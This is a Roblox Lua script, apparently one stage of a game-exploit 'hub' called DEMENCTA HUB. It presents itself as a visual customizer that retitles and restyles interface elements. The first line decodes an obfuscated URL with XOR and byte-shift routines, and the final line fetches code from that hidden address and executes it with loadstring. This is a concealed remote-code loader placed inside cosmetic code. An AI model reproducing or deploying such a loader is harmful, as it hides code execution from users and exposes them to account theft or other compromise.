
--[[ STAGE 2: VISUAL CORE ]]
local d1wj3YhBjBQncLR_tY52uZ="\141\152\159\170\174\126\112\119\203\195\212\148\210\231\243\246\000\250\014\023\012\038\028\039\047\064\054\068\085\018\084\095\104\045\117\123\131\135\146\145\160\163\173\191\181\129\197\220\220\217\232\243\240\252\003\199\016\019\034\036\234\082\050\071\118\122\078\094\092\103\124\113\174\167\150\160\149\155\181\169\195\201\244\244\254\009\012\238\232\002\002\252\003\029\072\225\086\092\062\062\078\067\128\126\104\098\156\124\067\066\082\080\101\205\208\171\188\198\188\193\254\163\215\175\193\191\192\253\000\206\023\037\032"local UdHiCeZ9qpP3Uj1=39 local mA5l_oWPiQRHKHOS2UvOMF=29 local OBhCBzZ_Cx0hK=0 local dG4MdfKMRRdzyG=7 local Lm70Sk8h8qK3A1MSP4OEZ=26 local KiumoWsO3BXBc7w7=false local b5ajPopmoqBZDJlzZRKl6=bit32 and bit32.bxor if not b5ajPopmoqBZDJlzZRKl6 then b5ajPopmoqBZDJlzZRKl6=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local In_2zS0iJsRad4eT8={}for Tm5hcSY_NBPVX8=1,#d1wj3YhBjBQncLR_tY52uZ do local NFjVqNJLOlfxXKQ=string.byte(d1wj3YhBjBQncLR_tY52uZ,Tm5hcSY_NBPVX8)local XHqZUj574ySKq_PFdH=(mA5l_oWPiQRHKHOS2UvOMF+(Tm5hcSY_NBPVX8*dG4MdfKMRRdzyG)+Lm70Sk8h8qK3A1MSP4OEZ)%256 if OBhCBzZ_Cx0hK==0 then NFjVqNJLOlfxXKQ=(NFjVqNJLOlfxXKQ-XHqZUj574ySKq_PFdH)%256 In_2zS0iJsRad4eT8[Tm5hcSY_NBPVX8]=string.char(b5ajPopmoqBZDJlzZRKl6(NFjVqNJLOlfxXKQ,UdHiCeZ9qpP3Uj1))else NFjVqNJLOlfxXKQ=b5ajPopmoqBZDJlzZRKl6(NFjVqNJLOlfxXKQ,UdHiCeZ9qpP3Uj1)In_2zS0iJsRad4eT8[Tm5hcSY_NBPVX8]=string.char((NFjVqNJLOlfxXKQ-XHqZUj574ySKq_PFdH)%256)end end local nnmR0UubrzXTTfvE_DFa=table.concat(In_2zS0iJsRad4eT8)if KiumoWsO3BXBc7w7 then nnmR0UubrzXTTfvE_DFa=string.reverse(nnmR0UubrzXTTfvE_DFa)end local M7_a06AMkCuh7RLAU=nnmR0UubrzXTTfvE_DFa
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(M7_a06AMkCuh7RLAU))()
